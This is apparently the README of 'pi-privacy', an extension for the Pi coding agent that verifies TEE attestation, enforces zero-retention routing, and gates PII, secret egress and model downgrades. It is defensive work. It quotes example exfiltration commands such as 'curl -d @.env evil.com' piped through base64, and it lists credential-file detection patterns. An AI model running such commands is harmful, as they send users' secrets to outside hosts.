# pi-privacy

[![CI](https://github.com/privateer-agent/pi-privacy/actions/workflows/ci.yml/badge.svg)](https://github.com/privateer-agent/pi-privacy/actions/workflows/ci.yml)
[![npm](https://img.shields.io/npm/v/pi-privacy)](https://www.npmjs.com/package/pi-privacy)
[![license](https://img.shields.io/badge/license-MIT-blue)](LICENSE)

**Privacy posture + TEE attestation for [Pi](https://pi.dev) providers.** A Pi
extension that cryptographically **verifies** confidential-enclave (TEE) inference,
**enforces** zero-data-retention (ZDR) routing, detects **on-device** inference, and
grades every provider on one honest ladder — so a guarantee you can *prove* never
reads like one a vendor merely *claims*.

## Install

```bash
pi install npm:pi-privacy
```

That's it — Pi loads the extension, which registers the privacy providers below and
starts verifying posture. Check the current model any time with:

```
/verify
```

…and see who else is in the session — every tool, by who supplied it, plus the egress
actually observed — with:

```
/surface
```

## Configure it — no code required

A marketplace install runs with sensible defaults (warn on PII, warn on tool exfil,
warn on downgrade, badge on). To change any non-code option you **don't** have to write
TypeScript — set an environment variable, or drop a `pi-privacy.config.json` next to
where you launch Pi. Env wins over the file; anything unset keeps its default.

```bash
# e.g. silently redact PII, hard-block tool exfiltration, and enforce OpenRouter ZDR
export PI_PRIVACY_PII_POLICY=redact
export PI_PRIVACY_TOOL_EXFIL_POLICY=block
export PI_PRIVACY_ENFORCE_OPENROUTER_ZDR=true
```

```jsonc
// pi-privacy.config.json  (or point PI_PRIVACY_CONFIG=<path> at one anywhere)
{
  "piiPolicy": "redact",          // warn | redact | off
  "piiAllow": ["@acme.com", "10.0.0.0/8"],   // values that aren't PII here (see below)
  "toolExfilPolicy": "block",     // warn | block | off
  "toolResultPolicy": "warn",     // warn | redact | off
  "downgradePolicy": "warn",      // warn | block | off
  "enforceOpenRouterZdr": true,
  "showBadge": true,
  "badgeSinks": ["status", "widget", "title"]
}
```

| Env var | Option | Values |
|---|---|---|
| `PI_PRIVACY_PII_POLICY` | `piiPolicy` | `warn` \| `redact` \| `off` |
| `PI_PRIVACY_PII_ALLOW` | `piiAllow` | comma/space list — `me@acme.com`, `@acme.com`, `10.0.0.0/8`, `ghp_dead*` |
| `PI_PRIVACY_PII_ALLOW_DEFAULTS` | `piiAllowDefaults` | `true` \| `false` |
| `PI_PRIVACY_TOOL_EXFIL_POLICY` | `toolExfilPolicy` | `warn` \| `block` \| `off` |
| `PI_PRIVACY_TOOL_RESULT_POLICY` | `toolResultPolicy` | `warn` \| `redact` \| `off` |
| `PI_PRIVACY_DOWNGRADE_POLICY` | `downgradePolicy` | `warn` \| `block` \| `off` |
| `PI_PRIVACY_ENFORCE_OPENROUTER_ZDR` | `enforceOpenRouterZdr` | `true` \| `false` |
| `PI_PRIVACY_SHOW_BADGE` | `showBadge` | `true` \| `false` |
| `PI_PRIVACY_BADGE_SINKS` | `badgeSinks` | comma list of `status`/`widget`/`title`/`notify` |
| `PI_PRIVACY_BADGE_KEY` | `badgeKey` | any string |
| `PI_PRIVACY_MODEL_PICKER` | `modelPicker` | `true` \| `false` |
| `PI_PRIVACY_MODEL_PICKER_COMMAND` | `modelPickerCommand` | any string (default `models`) |
| `PI_PRIVACY_TOOL_SURFACE_POLICY` | `toolSurfacePolicy` | `warn` \| `report` \| `off` |
| `PI_PRIVACY_TOOL_SURFACE_COMMAND` | `toolSurfaceCommand` | any string (default `surface`) |
| `PI_PRIVACY_INSTALL_DISPATCHER` | `installDispatcher` | `true` \| `false` |
| `PI_PRIVACY_REGISTER_PROVIDERS` | `registerProviders` | `true` \| `false` |
| `PI_PRIVACY_USE_DISPATCHER_TRANSPORT` | `useDispatcherTransport` | `true` \| `false` |

Honest by default: an invalid value (`PI_PRIVACY_PII_POLICY=redct`) is **never** quietly
coerced to something less protective than you meant — it warns and falls back to the
built-in default. The three function options (`onPosture`, `resolveTier`, `renderBadge`)
are code-only; reach them by importing `makePiPrivacyExtension` (see [Programmatic
use](#programmatic-use)).

### A project you open can't disarm you

A `pi-privacy.config.json` found in the working directory arrived with the **repository
you cloned** — not from you. Honored blindly it's a disable switch: `{"piiPolicy":"off",
"toolExfilPolicy":"off"}` in a hostile repo turns off the guards of everyone who opens
it, silently. So an implicit project-local file may only make a setting **more**
protective than the built-in default; anything that would weaken one is dropped, and
each drop is named:

```
[pi-privacy] project-local pi-privacy.config.json sets piiPolicy="off", which is WEAKER
than the built-in default ("warn") — ignoring it. …
```

The floor covers the guards *and* the badge (`showBadge`, `badgeSinks`, `modelPicker`,
`installDispatcher`, `useDispatcherTransport`, `toolSurfacePolicy`) — hiding the posture
display is its own attack, since you can't notice you dropped to `standard` if nothing
says so. `toolSurfacePolicy` is the sharpest case: it's the axis that reports tools *the
project supplied*, so a repo turning it down isn't a hypothetical attack, it's the whole
attack.

Three keys are dropped from a project-local file **outright** rather than ranked. Two are
command names — `toolSurfaceCommand` and `modelPickerCommand` — because a rename weakens
no policy a rank can measure; it just makes `/surface` or `/models` unfindable, which is
all it needed to do. The third is `piiAllow`: an allowlist only ever *removes* detection,
so `{"piiAllow": ["*@*"]}` is `piiPolicy: "off"` for exactly the data that repo cares
about, and it would read as a gate that honestly found nothing.

Tightening is never second-guessed. Two escapes, both requiring something a repo can't plant: set
the `PI_PRIVACY_*` env var, or point `PI_PRIVACY_CONFIG` at the file explicitly (a path
you typed is yours, and is honored in full). A host that has actually resolved project
trust — Pi's `project_trust` event, `ctx.isProjectTrusted()` — can pass
`loadConfig({ projectTrusted: true })`.

## The one rule: verified ≠ asserted

Every tier states the strength of its evidence. A green "verified TEE" badge means
remote attestation actually checked the hardware; a ZDR badge means the provider
*promises* not to retain data. Those are different things, and pi-privacy never lets
them look the same.

| Tier | Badge | Evidence | Meaning |
|---|---|---|---|
| `tee-verified` | **Verified TEE** | cryptographic | Remote attestation proved genuine enclave hardware **and** the live TLS key matched the report. |
| `local` | **On-device** | observable | Loopback endpoint — inference runs locally, nothing leaves the machine. |
| `zdr-enforced` | **ZDR (enforced)** | observable | Zero-retention routing actively pinned — requests only reach non-retaining providers. Policy, not hardware. |
| `tee-unverified` | **TEE (unconfirmed)** | none | Provider claims a TEE, but attestation was incomplete or unmatched. |
| `zdr-policy` | **ZDR (by policy)** | policy | Provider promises zero retention; unverifiable. Not hardware, not attested. |
| `standard` | **Standard** | none | No special guarantee. |

## Providers

| Provider | Tier | How it's checked |
|---|---|---|
| `privateer` | Verified TEE → ZDR (by policy) | Posture-aware. The public developer key (`sk-priv-…`) is server-proxied — the proxy mediates attestation, so pi-privacy can't verify the enclave end-to-end and honestly floors it to zero-retention *policy*. **Verified TEE** comes from the in-app **account** channel, which the host (privateer-agent) operates — its own OAuth session + account server + sealed relay — reusing this package's `interpretReport`/`teePosture` and injecting the verdict via `resolveTier` (the picker's ◆ *Verifiable TEE* label is gated on the `privateerVerifiedTee` capability signal) |
| `tinfoil` | Verified TEE | SEV-SNP attestation; the enclave's TLS key (SPKI) is pinned against the connection Pi actually uses |
| `nearai` | Verified TEE | Attestation report (Intel TDX + NVIDIA CC) fetched over HTTPS, bound to a fresh nonce |
| `openrouter` | ZDR (posture-aware) | `zdr-policy` until enforcement pins routing → `zdr-enforced` |
| `venice`, `fireworks` | ZDR (by policy) | Provider policy; honest limits noted (e.g. Venice is not TEE-attested) |
| `ollama`, `custom` | On-device | Detected when the endpoint is a loopback URL |

Providers with no verifiable or default privacy channel (Together, DeepSeek, MiniMax,
Qwen, …) are intentionally left `standard` with **no badge** — anything else would
overclaim.

## Posture-aware PII gate

The second axis: not just *is the channel private*, but *should this data go down it*.
Before a request leaves for an **unverified** channel (anything below verified-TEE /
on-device), pi-privacy scans it for **structured PII** — emails, phones, SSNs, credit
cards (Luhn-checked), IPs — and, by default, **warns** you with the choice to send,
redact, or (implicitly) switch models. On a **verified-TEE** or **local** model it does
nothing — an attested enclave can't read your data and a loopback endpoint never sends
it. (ZDR is *not* exempt: a ZDR provider still *sees* the data, it just doesn't retain it.)

```ts
makePiPrivacyExtension({ piiPolicy: "warn" }); // "warn" (default) | "redact" | "off"
```

The detector also catches **secrets** — the PII that actually leaks in a coding
session: API keys (`sk-…`, Slack, Google, Stripe), AWS access keys, GitHub tokens,
JWTs, and PEM private-key blocks. These are prefix-anchored, so precision stays high
without an entropy heuristic that would flag every hash or id. A credential present
escalates the warning wording.

### A gate you don't learn to dismiss

A warning that fires on every turn is a warning you stop reading, so the gate is built
to fire on **what you haven't already answered**:

- **It asks once per finding, not once per turn.** The outbound payload is the *whole*
  conversation, so PII you already decided about is still in it next turn. Your answer
  is remembered *for that PII*: unchanged findings re-apply it silently, and the prompt
  returns only when something new appears — a new type, or one more of a type ("*1 email
  new since your last answer*"). Switching to a different **provider** re-arms it: saying
  "send it" to one company isn't saying it to the next.
- **You can see what it found.** *Show what was detected* re-opens the same choice with a
  masked breakdown — `p…k@realmail.com`, `192.168.1.•`, `ghp_12… (40 chars)` — plus what
  the allowlist suppressed. Masking is one-way: enough to recognize your own fixture,
  never enough to reconstruct from a screenshot. Types where every digit matters (SSN,
  card, IBAN) show a count and nothing else.
- **`piiAllow` — things that aren't PII here.** Pattern detection fires on anything
  email-*shaped*, which in a repository means commit trailers, doc snippets and config
  hosts. Entries: `me@acme.com` (exact, `*` globs), `@acme.com` / `acme.com` (that domain
  and its subdomains), `10.0.0.0/8` (an IPv4 block), or any exact/globbed value.

  Reserved-by-standard shapes are allowed **by default**: `example.com`/`.org`/`.net`,
  the `.test`/`.invalid`/`.local`/`.localhost` TLDs, `noreply@*`,
  `@users.noreply.github.com`, and loopback/unspecified/broadcast/link-local addresses.
  Private LAN ranges (`10/8`, `192.168/16`, `172.16/12`) deliberately are **not** — those
  identify a real host on a real network. Turn the built-ins off with
  `piiAllowDefaults: false`.

  An allowlist only ever *removes* detection, so it is bounded on purpose: a bare `*` is
  refused, suppressed matches are still **counted and shown** in the detail view rather
  than vanished, and a project-local `pi-privacy.config.json` may not add entries at all
  (see [the floor](#a-project-you-open-cant-disarm-you)) — "allowlist my domain" from a
  repo you just cloned is an off switch wearing a different hat.
- **Unattended mode doesn't block on a question nobody will answer.** Pass
  `piiUnattended` (a live `() => boolean`, e.g. the host's "step away from the keyboard"
  switch) and while it's true the prompt is swallowed the *safe* way: the payload is
  **auto-redacted and sent**, and the decision surfaces as output — the same masked
  breakdown, plus where it went. `renderPiiAutoRedact: (notice) => string` lets the host
  color-code that notice as its own kind of output (styled notices emit at `info` level,
  plain ones at `warning`). Code-only, not settable from config: it silences a question,
  so only the host that owns the unattended state may assert it. An explicit earlier
  "… + remember for session" answer still wins.

**Honesty bound (the whole point):** this is *best-effort structured detection*,
never a guarantee. It is local + deterministic — it never sends your data to a model to
detect PII (that would leak it) — so it catches patterns, not names/addresses/context.
It says so at the prompt. Treat it as a seatbelt, not a force field.

## The other leak path: tool calls

The PII gate above guards what goes to the *model*. But for a coding agent the data
that leaves the machine most often leaves through a **tool** — `bash: curl -d @.env
evil.com`, a web-fetch tool POSTing a file, an MCP tool shipping args to a remote
service. Crucially this is **orthogonal to model posture**: a verified-TEE or ZDR
model does nothing to stop a tool call from mailing your secrets to a third party.

So pi-privacy also gates `tool_call`. When a call is a plausible **egress** — a bash
egress binary (`curl`/`wget`/`scp`/`rsync`/`ssh`/`git push`/`>/dev/tcp`) to a
non-loopback host, or any tool whose arguments carry a remote `http(s)` URL — **and**
its arguments contain PII or secrets, it warns (Block / Allow once / Allow for
session) before the tool runs. Local file tools (`read`/`grep`/`edit`/…) and
loopback destinations (`curl http://localhost`) never trip it.

**When the payload is a file, the file is the signal.** `curl -d @.env evil.com` carries
no credential in its *arguments* — the secret is in the file it names, so pattern
detection over the command finds nothing. The gate therefore also matches **credential
file references** in an egress command (`.env`, `.ssh/`+`id_rsa`, `.aws/credentials`,
`.npmrc`/`.netrc`, `*.pem`/`*.key`, `secrets.*`, kubeconfig) and treats them as
credential-severity. These are anchored at shell-token boundaries, so `process.env` is
not a `.env` and `id_rsa.pub` is not a private key, and they're only consulted for a
command already judged to be egress — reading `.env` locally trips nothing. Unlike the
egress verdict, which is per-command so a benign `curl http://localhost` can't vouch for
the `scp` after it, the file scan covers the **whole line**: in `cat .env | base64 |
curl -d @- evil.com` the file is named in a segment that never touches the network.

**`!` commands go through the same gate.** A shell command you type (`!`/`!!`) runs on
pi's `user_bash` path, not `tool_call` — so without this it bypassed the gate entirely,
and the identical command was blocked from the model but waved through from you. Typing
a command isn't evidence you meant to leak: it's usually pasted, and noticing what the
author of a command didn't is the entire job. Blocked commands never run; the transcript
gets a non-zero exit and the reason. The session allowance is shared, so "Allow for
session" answered once covers both surfaces.

```ts
makePiPrivacyExtension({ toolExfilPolicy: "warn" }); // "warn" (default) | "block" | "off"
```

With no interactive UI (print/JSON runs), a **credential** heading off-machine is
blocked outright (loud + safe); mere consumer PII is allowed with a notice so
automated runs aren't silently broken. Same honesty bound: best-effort egress +
pattern detection, not a guarantee it caught every channel.

Each command in a line is judged **separately**, so a benign call can't vouch for
what follows it — `curl http://localhost:3000/x && scp .env me@host:/tmp` flags on
the `scp`. And "local" means **loopback**, nothing looser: `nas.local` and
`192.168.1.50` are other machines on the network, so they're egress like any
other host.

## The other direction: what comes back *in*

Every gate above judges data on its way **out** — to the model, off the machine, or to a
weaker provider. None of them watch what comes **in**. But a coding agent pulls
credentials into its own context constantly: `read .env`, `bash: env`, `aws sts`, a
fetched dump. The moment a secret lands in a tool result it is (1) in the conversation,
re-sent to the provider on *every* later turn, (2) written to the session file on disk
(`~/.pi/agent/sessions/*.jsonl`) in **plaintext**, where it outlives the session
entirely, and (3) exactly the material the downgrade guard has to worry about when you
switch models.

Redacting at ingest is strictly stronger than warning at send: the secret never enters
the transcript, so there's nothing to re-send, persist, or downgrade out of.

```
⚠ read returned 1 GitHub token. Keeping it in context means re-sending to the provider
on every later turn, and writing to the session file on disk in plaintext.
   [Redact the credentials]  [Keep them in context]  [Redact for the session]  [Keep for the session]
```

```ts
makePiPrivacyExtension({ toolResultPolicy: "warn" }); // "warn" (default) | "redact" | "off"
```

**Credentials only** — API keys, tokens, private keys — never consumer PII. Rewriting an
email out of a file the agent is about to edit corrupts its view of that file for no
privacy gain, and the send-side gate already covers what reaches the model. Like the tool
gate, it's independent of model posture: a verified enclave does nothing about a key
being written to your disk. With no UI it redacts and says so (loud + safe, mirroring the
tool gate's credential default). If a secret turns up in a result shape we can't rebuild
safely, it says *that* — reporting a redaction that didn't happen is the same overclaim
this package exists to prevent.

## The third leak path: changing models mid-session

The two gates above judge one request, or one tool call. Neither can see the leak
that comes from the session itself: you work for an hour against a verified enclave
— `.env` contents, keys, customer rows, source all accumulating in context — and
then you switch models. On the next turn that **entire history** is re-sent to the
new provider. Nothing about the request looks different. What changed is the ceiling
over it, and only the transition reveals that.

So pi-privacy watches model switches. When the tier drops **and** the context it has
seen is known to carry PII or secrets, it warns before the next turn — and can put
the model back:

```
⚠ Privacy downgrade: Verified TEE → Standard. This session's history — carrying
1 GitHub token, 2 emails — will be re-sent to openrouter/gpt-x on the next turn.
   [Stay on the previous model]  [Switch anyway]  [Switch, redacting PII from now on]
```

```ts
makePiPrivacyExtension({ downgradePolicy: "warn" }); // "warn" (default) | "block" | "off"
```

The comparison is by **exposure**, not by tier rank: verified-TEE and on-device are
equal (an enclave can't read the payload; a loopback endpoint never gets it), so
moving between them is silent. `tee-unverified` sits with `zdr-policy`, not with
`tee-verified` — an unproven enclave claim protects nothing, so a TEE model whose
attestation fails to land *is* a downgrade and is caught on the second pass, once
attestation resolves. `block` always reverts; with no UI, a credential following the
session downhill reverts and mere PII is announced. A quiet switch means only that
nothing structured was detected — the same best-effort floor as everywhere else.

## Who else is in the room?

Every gate above is reactive: it judges one request, one tool call, one model switch.
None of them answers the question you'd want answered *first* — my model channel is a
verified enclave, so **who else is in this session, and who put them there?**

That question has teeth in Pi specifically. Pi has [no MCP by
design](https://mariozechner.at/posts/2025-11-02-what-if-you-dont-need-mcp/); its
third-party surface is **skills and extensions**, and it loads both from `.pi/` and
`.agents/` under the working directory — which means **they arrive with the repository
you cloned**. Pi's own docs say it plainly: *"Skills can instruct the model to perform
any action and may include executable code the model invokes."* pi-privacy already
makes this argument for configuration (a project you open can't disarm your guards); a
project could still **supply a capability**, and nothing was watching that.

So `/surface` inventories the session's tools by **who supplied them**, and records the
egress that was actually **observed**:

```
Tools     18 tools available · 2 not supplied by you
          ⚠ project   fetch_docs   .pi/extensions/docs.ts     — network (declared)
          ⚠ project   deploy       .pi/skills/deploy/SKILL.md — shell (unbounded)
          • package   grep_web     pi-web-tools               — network (declared)
          … 15 builtin
          ⚠ marks a tool that came with this working directory or a CLI flag, not
            from your configuration. That is where it came FROM — pi-privacy does
            not judge what it does.

Observed  bash → api.github.com    12 calls
          ! command → hooks.slack.com   1 call  (1 carried PII/credentials, 1 blocked)
          (observed via tool calls only — an extension's own fetch() never appears
           here, so this is a floor)
```

`/verify` carries a condensed version of the same section, because a verified enclave
was never the whole answer.

**Same honesty rule, third application.** Two things must never render alike:

- **declared** reach — the tool's own parameters or description carry a URL surface.
  Evidence: *none*. It's what the tool's author wrote, and an author who wanted to hide
  it simply wouldn't mention it. Always labeled `(declared)`.
- **observed** egress — we saw this call leave. Evidence: *observable*. The `Observed`
  block is the only place a host is ever named as fact.

That's the same split as the picker's ◆ *Verifiable* versus 🛡 *Verified*. And a second
rule that matters just as much: **provenance is not safety.** `builtin` doesn't mean
"safe", it means "not supplied by your repo"; a project-supplied tool is usually just
the repo's legitimate tooling. A tool whose reach reads `unassessed` is exactly that —
unassessed, not cleared.

Because Pi lets an extension *replace built-in tools entirely*, a project-supplied tool
that registers itself as `bash` or `read` is still reported as `project` — the familiar
name never wins over Pi's source metadata, or the one bucket that's never flagged would
be the easiest one to enter. For the same reason `local files only` is asserted only for
a genuine Pi builtin: a project-supplied `read` is a different tool that borrowed a name.

**The limit, stated where the evidence is shown.** The ledger only sees egress that
flows through Pi's `tool_call` / `user_bash` events. An extension that calls `fetch()`
inside its own handler never appears — pi-privacy *is* an extension and has no
privileged view of its peers. `Observed` is a **floor, not an accounting**, and an
under-reporting ledger that read as complete would be the same overclaim as a badge that
says verified without a proof.

### Asked once, at the moment it matters

An inventory you have to go read is an inventory nobody reads. So the first time a tool
**the project supplied** is about to run, pi-privacy asks — once:

```
⚠ `deploy` was supplied by this project (.pi/skills/deploy/SKILL.md), not by you. It is
about to run for the first time this session. This says where it came FROM, not that it
is unsafe.
   [Run it]  [Show me the file]  [Allow project tools for this session]  [Block]
```

Pi's docs say to *review skill content before use*; **[Show me the file]** is that advice
made reachable at the moment it's actionable, instead of a warning that assumes you
already did it. (It re-asks after showing you, and is bounded — no prompt loop.)

```ts
makePiPrivacyExtension({ toolSurfacePolicy: "warn" }); // "warn" (default) | "report" | "off"
```

Deliberately **not a permission system** — Pi ships no permission popups by design, and a
gate that fires on every call is a gate people switch off. So it fires once per tool, on
*provenance*, and **never for tools you chose** (builtin, user, package). `report` keeps
the inventory and drops the prompt; `off` disables the axis. Answering *"Allow project
tools for this session"* covers all of them at once.

Three details that follow from the honesty rule rather than convenience: **Block does not
latch** (a latch would wave the tool through the moment the model retried it), a host that
can't tell us where a tool came from produces **silence rather than a prompt** about a
provenance we never established, and with no UI it **allows with a notice** — provenance
is a signal, not a detected credential, so there's nothing here worth breaking an
unattended run over. There is no `block` mode: Pi can hard-disable a tool via
`setActiveTools`, but silently removing one changes what the model believes it can do and
makes the resulting failures unattributable.

## Pick privacy — don't just watch it

The badge and `/verify` *report* on a model you already chose. `/models` runs the other
direction: it lists the models you can actually use, **strongest privacy first**, each
labeled with what it can offer — so privacy is something you pick up front.

```
Pick a model (strongest privacy first — ◆ verifies on select):
  ◆ Verifiable TEE   ·  nearai/zai-org/GLM-5.1-FP8
  ◆ Verifiable TEE   ·  tinfoil/deepseek-v4-pro
  🛡 On-device       ·  ollama/llama3.1
  ⚠ ZDR (by policy)  ·  fireworks/…/glm-5p1
  • Standard         ·  openai/gpt-x   (current)
```

Same honesty rule as everywhere else, and it's the subtle part: an attestable TEE model
shows as **Verifiable** TEE with a hollow ◆ — *never* the live green "Verified" 🛡.
Ranking a whole list can't run an attestation per row (that would fire a probe at every
enclave just to draw a menu), so the picker ranks by **capability** — the best tier a
model can reach. The live proof lands the moment you select it: the normal
`model_select` → attestation path runs, the badge shows the real verdict, and `/verify`
prints the report. Capability is honestly labeled as capability; only a real attestation
earns the solid shield.

Only models you have auth for are listed (nothing you can't switch to). In a
non-interactive run (`-p`/JSON) `/models` prints the ranking as text instead of
prompting. Rename or disable it via `modelPickerCommand` / `modelPicker`
(`PI_PRIVACY_MODEL_PICKER=off`).

## Always-on posture badge

The whole point — *verified ≠ asserted* — is only useful if you can see it. pi-privacy
paints a live badge, updated on every model switch and request: 🛡 for a
cryptographically **verified** tier, ⚠ for an **asserted**/unconfirmed one, • for
standard, and `⋯ checking privacy` while attestation is still running (it never shows a
green ceiling before the proof lands).

Rendering is a **configurable fallback chain**, not a single call — different Pi
UIs/modes expose different methods, so the badge renders to the *first* surface the
current UI actually supports and never silently vanishes:

```ts
makePiPrivacyExtension({
  showBadge: true,                          // default true
  badgeSinks: ["status", "widget", "title"], // ordered fallback; add "notify" to surface changes
  badgeKey: "pi-privacy",                    // the key setStatus/setWidget write under
  // Or take over rendering entirely (custom widget, external status line, telemetry):
  renderBadge: (badge, tier, ctx) => ctx.ui?.setStatus?.("my-key", badge),
});
```

`status` (footer) and `widget` (line above the editor) are non-intrusive extension
surfaces; `title` replaces the session title (a broad-reach last resort); `notify`
fires a message and — because the badge de-dupes unchanged posture — only on change.
Every method is feature-detected, so an unsupported sink is skipped, not an error.

## How verification works

- **Tinfoil (SPKI pinning).** Pi's provider requests flow through a process-wide
  `undici` dispatcher that captures the enclave's TLS public-key fingerprint on the
  *actual inference connection*. That fingerprint is matched against
  `report_data[0:32]` of the signed SEV-SNP attestation — so "verified" means the
  channel you're using demonstrably ends inside the enclave.
- **NEAR (report body).** A fresh nonce is sent with the attestation request; the
  returned report must carry a TEE signing key and hardware evidence and echo the
  nonce (freshness / anti-replay).
- **ZDR (enforced).** For OpenRouter, requests carry
  `provider: { zdr: true, data_collection: "deny" }`. OpenRouter filters routing to
  compliant providers and returns `404 No allowed providers` when the policy can't be
  met — it doesn't silently ignore the constraint, which is why `zdr-enforced` is honest.
- **Local.** A loopback endpoint is observable, so on-device inference is detected
  rather than claimed. Loopback strictly: `localhost` (and RFC 6761 subdomains), all
  of `127.0.0.0/8`, `::1`, `0.0.0.0`. A LAN address — `box.local`, `192.168.1.50` —
  is a *different machine*, so it stays `standard`; calling it on-device would be
  exactly the overclaim this package exists to prevent.

These are *pragmatic* checks suited to an interactive agent, not a replacement for a
full verifier ([nearai/cloud-verifier](https://github.com/nearai/cloud-verifier),
[tinfoilsh/tinfoil-cli](https://github.com/tinfoilsh/tinfoil-cli)); `/verify` prints
the raw report so you can take it to one.

## Programmatic use

```ts
import { makePiPrivacyExtension, verifyModelPosture, effectiveTier } from "pi-privacy";

// Configure the extension (e.g. enforce ZDR, receive posture updates):
const ext = makePiPrivacyExtension({
  enforceOpenRouterZdr: true,          // opt-in; a model with no ZDR endpoint will 404
  onPosture: (r) => renderBadge(r),    // { tier, teePosture?, attestation? }
});

// Verify a specific model on demand:
const posture = await verifyModelPosture("tinfoil", "llama3-3-70b");
// → { tier: "tee-verified", teePosture: "green", attestation: {...} }

// Or just the static/enforcement tier, no network:
effectiveTier("openrouter", { zdrEnforced: true }); // → "zdr-enforced"
```

`makePiPrivacyExtension(options?)` — `installDispatcher`, `registerProviders`,
`enforceOpenRouterZdr`, `useDispatcherTransport`, `onPosture`, `resolveTier`,
`piiPolicy`, `piiAllow`, `piiAllowDefaults`, `toolExfilPolicy`, `toolResultPolicy`, `downgradePolicy`, `modelPicker`, `modelPickerCommand`,
`toolSurfacePolicy`, `toolSurfaceCommand`, `showBadge`, `badgeSinks`, `badgeKey`, `renderBadge`. Every option except the three
functions (`onPosture`/`resolveTier`/`renderBadge`) is also settable with **no code**
via env vars or `pi-privacy.config.json` — see [Configure it](#configure-it--no-code-required).

## Contributing & security

Adding a provider or a detection pattern is a mechanical, well-documented path — see
[CONTRIBUTING.md](CONTRIBUTING.md), which also spells out the one rule every change must
uphold (*verified ≠ asserted*). CI (typecheck + the unit-test suite) runs on every PR, and
releases publish to npm **with provenance** — a signed attestation linking the
tarball to its source commit, the same discipline this package applies to model providers.

Found a way to make a badge over-claim, or a structured-PII false negative? That's a
first-priority report — privately via [SECURITY.md](SECURITY.md).

## Requirements

Node ≥ 22.19.0 (the Pi runtime's floor). MIT licensed.
